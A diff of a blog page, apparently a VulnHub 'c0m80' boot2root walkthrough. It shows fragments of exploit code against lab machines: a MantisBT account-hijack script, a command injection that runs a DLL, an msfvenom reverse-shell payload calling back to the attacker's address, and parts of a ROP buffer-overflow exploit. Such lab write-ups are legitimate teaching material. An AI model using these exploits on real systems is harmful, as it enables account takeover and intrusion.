@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2017/10/12/vulnhub-c0m80-boot2root.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -338,7 +318,8 @@ HOP RTT     ADDRESS
 
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Oct  5 10:51:39 2017 -- 1 IP address (1 host up) scanned in 17.13 seconds</pre></td></tr></tbody></table></code></pre></figure>
+# Nmap done at Thu Oct  5 10:51:39 2017 -- 1 IP address (1 host up) scanned in 17.13 seconds
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>The first scan yields quite a bit of information:</p>
 <ul>
@@ -566,7 +547,8 @@ OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
 S-1-22-1-1000 Unix User\b0b (Local User)
 S-1-22-1-1001 Unix User\al1ce (Local User)
 
-[...]</pre></td></tr></tbody></table></code></pre></figure>
+[...]
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>The information we are able to grab from that scan:</p>
 <ul>
@@ -586,7 +568,8 @@ depending on what we can write/overwrite or read.</p>
 3
 </pre></td><td class="code"><pre>root@kali:~/c0m80# showmount -e 192.168.56.101
 Export list for 192.168.56.101:
-/ftpsvr/bkp *</pre></td></tr></tbody></table></code></pre></figure>
+/ftpsvr/bkp *
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>It does export a share that is accessible to anyone and we probably also have
 RW permissions.</p>
@@ -606,7 +589,8 @@ root@kali:~/c0m80# ls -lash bkp/
 total 2.7M
 4.0K drwxrwx--- 2 root   backup 4.0K Sep 22 21:37 .
 4.0K drwxr-xr-x 3 root   root   4.0K Oct  5 13:55 ..
-2.7M -rw-r--r-- 1 backup backup 2.7M Oct  5  2017 ftp104.bkp</pre></td></tr></tbody></table></code></pre></figure>
+2.7M -rw-r--r-- 1 backup backup 2.7M Oct  5  2017 ftp104.bkp
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>That ftp104.bkp is a hexdump of a binary we’ll have to exploit, this will be
 detailed in a later section.</p>
@@ -664,7 +648,8 @@ an exploitable vulnerability or wish to develop an 0day.</p>
 &lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/open-sans.css" /&gt;
 &lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/bootstrap-datetimepicker-4.17.43.min.css" /&gt;
 &lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/ace.min.css" /&gt;
-&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/ace-mantis.css" /&gt;</pre></td></tr></tbody></table></code></pre></figure>
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/ace-mantis.css" /&gt;
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Going through the available files on sourceforge, we end up finding our MantisBT version : 2.x.0.</p>
 
@@ -778,29 +763,29 @@ m_101
 <span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
 
-<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
-    <span class="k">print</span> <span class="s">'Usage: </span><span class="si">%</span><span class="s">s target_ip user_id new_pass'</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Usage: %s target_ip user_id new_pass'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
     <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">new_pass</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">new_pass</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span>
 
-<span class="n">mysession</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span> <span class="p">()</span>
+<span class="n">mysession</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span> <span class="p">()</span>
 
 <span class="c1"># exploit the vuln
-</span><span class="n">url</span> <span class="o">=</span> <span class="s">'http://</span><span class="si">%</span><span class="s">s/bugs/verify.php?id=</span><span class="si">%</span><span class="s">s&amp;confirm_hash='</span> <span class="o">%</span> <span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">user_id</span><span class="p">)</span>
-<span class="n">response</span> <span class="o">=</span> <span class="n">mysession</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span><span class="n">url</span> <span class="o">=</span> <span class="s">'http://%s/bugs/verify.php?id=%s&amp;confirm_hash='</span> <span class="o">%</span> <span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">user_id</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">mysession</span><span class="p">.</span><span class="n">get</span> <span class="p">(</span><span class="n">url</span><span class="p">)</span>
 
 <span class="c1"># do the parsing
-</span><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span> <span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
+</span><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span> <span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
 
 <span class="c1"># get CSRF token and realname
 </span><span class="n">account_update_token</span> <span class="o">=</span> <span class="bp">None</span>
 <span class="n">realname</span> <span class="o">=</span> <span class="bp">None</span>
-<span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span> <span class="p">(</span><span class="s">'input'</span><span class="p">):</span>
-    <span class="k">if</span> <span class="n">account_update_token</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">tag</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'name'</span><span class="p">)</span> <span class="o">==</span> <span class="s">'account_update_token'</span><span class="p">:</span>
-        <span class="n">account_update_token</span> <span class="o">=</span> <span class="n">tag</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'value'</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">realname</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">tag</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'name'</span><span class="p">)</span> <span class="o">==</span> <span class="s">'realname'</span><span class="p">:</span>
-        <span class="n">realname</span> <span class="o">=</span> <span class="n">tag</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'value'</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="p">.</span><span class="n">find_all</span> <span class="p">(</span><span class="s">'input'</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">account_update_token</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">tag</span><span class="p">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'name'</span><span class="p">)</span> <span class="o">==</span> <span class="s">'account_update_token'</span><span class="p">:</span>
+        <span class="n">account_update_token</span> <span class="o">=</span> <span class="n">tag</span><span class="p">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'value'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">realname</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">tag</span><span class="p">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'name'</span><span class="p">)</span> <span class="o">==</span> <span class="s">'realname'</span><span class="p">:</span>
+        <span class="n">realname</span> <span class="o">=</span> <span class="n">tag</span><span class="p">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'value'</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">account_update_token</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">realname</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
     <span class="k">print</span> <span class="s">'[-] Failed getting account update token or realname'</span>
@@ -815,23 +800,24 @@ m_101
     <span class="s">'password_confirm'</span> <span class="p">:</span> <span class="n">new_pass</span>
 <span class="p">}</span>
 
-<span class="n">url</span> <span class="o">=</span> <span class="s">'http://</span><span class="si">%</span><span class="s">s/bugs/account_update.php'</span> <span class="o">%</span> <span class="n">target_ip</span>
-<span class="n">response</span> <span class="o">=</span> <span class="n">mysession</span><span class="o">.</span><span class="n">post</span> <span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">form</span><span class="p">)</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://%s/bugs/account_update.php'</span> <span class="o">%</span> <span class="n">target_ip</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">mysession</span><span class="p">.</span><span class="n">post</span> <span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">form</span><span class="p">)</span>
 
 <span class="n">success</span> <span class="o">=</span> <span class="bp">False</span>
-<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">split</span> <span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">):</span>
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">split</span> <span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">):</span>
     <span class="k">if</span> <span class="s">'Operation successful.'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
         <span class="n">success</span> <span class="o">=</span> <span class="bp">True</span>
         <span class="k">break</span>
 
-<span class="k">print</span> <span class="s">'realname : </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">realname</span>
-<span class="k">print</span> <span class="s">'token    : </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">account_update_token</span>
+<span class="k">print</span> <span class="s">'realname : %s'</span> <span class="o">%</span> <span class="n">realname</span>
+<span class="k">print</span> <span class="s">'token    : %s'</span> <span class="o">%</span> <span class="n">account_update_token</span>
 
 <span class="k">if</span> <span class="n">success</span><span class="p">:</span>
     <span class="k">print</span> <span class="s">'[+] Successfully hijacked account'</span>
-    <span class="k">print</span> <span class="s">'     new password : </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">new_pass</span>
+    <span class="k">print</span> <span class="s">'     new password : %s'</span> <span class="o">%</span> <span class="n">new_pass</span>
 <span class="k">else</span><span class="p">:</span>
-    <span class="k">print</span> <span class="s">'[-] Exploit failed'</span></pre></td></tr></tbody></table></code></pre></figure>
+    <span class="k">print</span> <span class="s">'[-] Exploit failed'</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We find out 2 interesting tickets:
 Issue : http://192.168.56.101/bugs/view.php?id=6
@@ -895,18 +881,18 @@ desc : This rebuild the .txt dump to a .bin
 <span class="kn">import</span> <span class="nn">re</span>
 <span class="kn">import</span> <span class="nn">string</span>
 
-<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
-    <span class="k">print</span> <span class="s">'Usage: </span><span class="si">%</span><span class="s">s bkp exe'</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Usage: %s bkp exe'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
     <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">bkp</span><span class="p">,</span> <span class="n">exe</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">bkp</span><span class="p">,</span> <span class="n">exe</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span>
 
 <span class="k">def</span> <span class="nf">is_valid_hex</span> <span class="p">(</span><span class="n">hex_str</span><span class="p">):</span>
     <span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">hex_str</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">False</span>
 
     <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">hex_str</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">hexdigits</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">hexdigits</span><span class="p">:</span>
             <span class="k">return</span> <span class="bp">False</span>
 
     <span class="k">return</span> <span class="bp">True</span>
@@ -914,18 +900,19 @@ desc : This rebuild the .txt dump to a .bin
 <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="n">bkp</span><span class="p">)</span>
 
 <span class="n">content</span> <span class="o">=</span> <span class="s">''</span>
-<span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span> <span class="p">(</span><span class="n">fp</span><span class="o">.</span><span class="n">readlines</span> <span class="p">()):</span>
-    <span class="n">line</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span> <span class="p">(</span><span class="s">' +'</span><span class="p">,</span> <span class="s">' '</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
-    <span class="n">fields</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span> <span class="p">(</span><span class="s">' '</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span> <span class="p">(</span><span class="n">fp</span><span class="p">.</span><span class="n">readlines</span> <span class="p">()):</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">sub</span> <span class="p">(</span><span class="s">' +'</span><span class="p">,</span> <span class="s">' '</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
+    <span class="n">fields</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span> <span class="p">(</span><span class="s">' '</span><span class="p">)</span>
 
     <span class="k">for</span> <span class="n">field</span> <span class="ow">in</span> <span class="n">fields</span><span class="p">:</span>
         <span class="k">if</span> <span class="n">is_valid_hex</span> <span class="p">(</span><span class="n">field</span><span class="p">):</span>
-            <span class="n">content</span> <span class="o">+=</span> <span class="n">field</span><span class="o">.</span><span class="n">decode</span> <span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
-<span class="n">fp</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
+            <span class="n">content</span> <span class="o">+=</span> <span class="n">field</span><span class="p">.</span><span class="n">decode</span> <span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+<span class="n">fp</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span>
 
 <span class="n">fp_out</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
-<span class="n">fp_out</span><span class="o">.</span><span class="n">write</span> <span class="p">(</span><span class="n">content</span><span class="p">)</span>
-<span class="n">fp_out</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="n">fp_out</span><span class="p">.</span><span class="n">write</span> <span class="p">(</span><span class="n">content</span><span class="p">)</span>
+<span class="n">fp_out</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>When we rebuild the binary from the hexdump (the ftp104.bkp file),
 we get a PE binary. The PE executable format is mainly used on Windows,
@@ -962,7 +949,8 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 621288        0x97AE8         Unix path: /debian/tmp/usr/i686-w64-mingw32/include/psdk_inc
 622223        0x97E8F         Unix path: /debian/tmp/usr/i686-w64-mingw32/include
 626096        0x98DB0         Unix path: /debian/tmp/usr/i686-w64-mingw32/include
-627522        0x99342         Unix path: /debian/tmp/usr/i686-w64-mingw32/include</pre></td></tr></tbody></table></code></pre></figure>
+627522        0x99342         Unix path: /debian/tmp/usr/i686-w64-mingw32/include
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>There are in fact 2 binaries.</p>
 
@@ -989,7 +977,8 @@ $ dd if=ftp104.bin of=bfsvrdll.dll bs=1 skip=379576
 278766+0 records out
 278766 bytes (279 kB, 272 KiB) copied, 0.287341 s, 970 kB/s
 $ file bsvrdll.dll 
-bfsvrdll.dll: PE32 executable (DLL) (console) Intel 80386, for MS Windows</pre></td></tr></tbody></table></code></pre></figure>
+bfsvrdll.dll: PE32 executable (DLL) (console) Intel 80386, for MS Windows
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Now our binary runs properly.</p>
 
@@ -1112,7 +1101,8 @@ The vulnerability is triggered by sending a string in the following form:</p>
 .text:004022A0                 call    eax ; __imp__send@16
 .text:004022A2                 sub     esp, 10h
 .text:004022A5                 mov     [ebp+var_1C], eax
-.text:004022A8                 jmp     loc_403A5A</pre></td></tr></tbody></table></code></pre></figure>
+.text:004022A8                 jmp     loc_403A5A
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>The buffer overflow on the other hand is quite exploitable.</p>
 
@@ -1265,7 +1255,8 @@ the “[cmd]” string.</p>
 .text:00403809                 mov     eax, [ebp+tmp_buf]
 .text:0040380C                 mov     [esp], eax      ; buf
 .text:0040380F                 call    vuln_function
-.text:00403814                 jmp     short loc_403822</pre></td></tr></tbody></table></code></pre></figure>
+.text:00403814                 jmp     short loc_403822
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>The vulnerable function calls strcpy() !!!
 A classic textbook stack based buffer overflow.</p>
@@ -1307,7 +1298,8 @@ A classic textbook stack based buffer overflow.</p>
 .text:00401AD0                 nop
 .text:00401AD1                 leave
 .text:00401AD2                 retn
-.text:00401AD2 vuln_function   endp</pre></td></tr></tbody></table></code></pre></figure>
+.text:00401AD2 vuln_function   endp
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Exploitation of both vulnerabilities will be detailed.</p>
 
@@ -1334,20 +1326,22 @@ A classic textbook stack based buffer overflow.</p>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
-    <span class="k">print</span> <span class="s">'Usage : </span><span class="si">%</span><span class="s">s ip'</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Usage : %s ip'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
     <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span>
 
 <span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="mi">20021</span><span class="p">)</span>
-<span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'http://</span><span class="si">%</span><span class="s">s &amp;&amp; rundll32 Z:</span><span class="se">\\</span><span class="s">ftpsrv</span><span class="se">\\</span><span class="s">bkp</span><span class="se">\\</span><span class="s">shell.dll '</span> <span class="o">%</span> <span class="n">target_ip</span><span class="p">)</span>
-<span class="n">target</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="n">target</span><span class="p">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'http://%s &amp;&amp; rundll32 Z:</span><span class="se">\\</span><span class="s">ftpsrv</span><span class="se">\\</span><span class="s">bkp</span><span class="se">\\</span><span class="s">shell.dll '</span> <span class="o">%</span> <span class="n">target_ip</span><span class="p">)</span>
+<span class="n">target</span><span class="p">.</span><span class="n">interactive</span> <span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Since it is a Linux target, we can embed a Linux payload into a DLL using msfvenom:</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f dll &gt; shell.dll</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f dll &gt; shell.dll
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>The buffer overflow is reliably exploitable for remote arbitrary code execution
 as shown in the next section.</p>
@@ -1415,7 +1409,8 @@ gadget execute and no ‘\x00’ when setting ebx value.</p>
         <span class="mh">0x87654321</span>
     <span class="p">]</span>
 
-    <span class="k">return</span> <span class="n">pack_rop</span> <span class="p">(</span><span class="n">ropchain</span><span class="p">)</span></pre></td></tr></tbody></table></code></pre></figure>
+    <span class="k">return</span> <span class="n">pack_rop</span> <span class="p">(</span><span class="n">ropchain</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>This allows us to write 4 bytes at an arbitrary location (provided the target
 address doesn’t have any NULL bytes).
@@ -1500,7 +1495,8 @@ Exploit target:
    0   Wildcard Target
 msf exploit(handler) &gt; exploit 
 [*] Exploit running as background job 0.
-[*] Started reverse TCP handler on 192.168.56.102:4444</pre></td></tr></tbody></table></code></pre></figure>
+[*] Started reverse TCP handler on 192.168.56.102:4444
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <h1 id="the-exploit">The exploit</h1>
 
@@ -1755,16 +1751,16 @@ Don’t forget to change the used shellcode with yours, otherwise it just won’
 
 <span class="k">def</span> <span class="nf">check_ip</span> <span class="p">(</span><span class="n">ip_addr</span><span class="p">):</span>
     <span class="k">try</span><span class="p">:</span>
-        <span class="n">is_valid</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">256</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="err">\</span><span class="s">.'</span><span class="p">,</span><span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s">r'^\d+\.\d+\.\d+\.\d+$'</span><span class="p">,</span> <span class="n">ip_addr</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">]</span><span class="o">.</span><span class="n">count</span> <span class="p">(</span><span class="bp">True</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span>
+        <span class="n">is_valid</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">256</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">re</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'\.'</span><span class="p">,</span><span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="s">r'^\d+\.\d+\.\d+\.\d+$'</span><span class="p">,</span> <span class="n">ip_addr</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">].</span><span class="n">count</span> <span class="p">(</span><span class="bp">True</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span>
     <span class="k">except</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">False</span>
     <span class="k">return</span> <span class="n">is_valid</span>
 
-<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
-    <span class="k">print</span> <span class="s">'Usage: </span><span class="si">%</span><span class="s">s rhost rport'</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Usage: %s rhost rport'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
     <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span>
 
 <span class="c1"># validate rhost
 </span><span class="k">if</span> <span class="n">check_ip</span> <span class="p">(</span><span class="n">rhost</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
@@ -1783,7 +1779,7 @@ Don’t forget to change the used shellcode with yours, otherwise it just won’
     <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">sebp</span> <span class="o">=</span> <span class="s">'B'</span> <span class="o">*</span> <span class="mi">4</span><span class="p">):</span>
-    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'cd '</span> <span class="o">+</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">43</span> <span class="o">+</span> <span class="n">sebp</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">'.'</span><span class="p">)</span>
+    <span class="n">target</span><span class="p">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'cd '</span> <span class="o">+</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">43</span> <span class="o">+</span> <span class="n">sebp</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">'.'</span><span class="p">)</span>
 
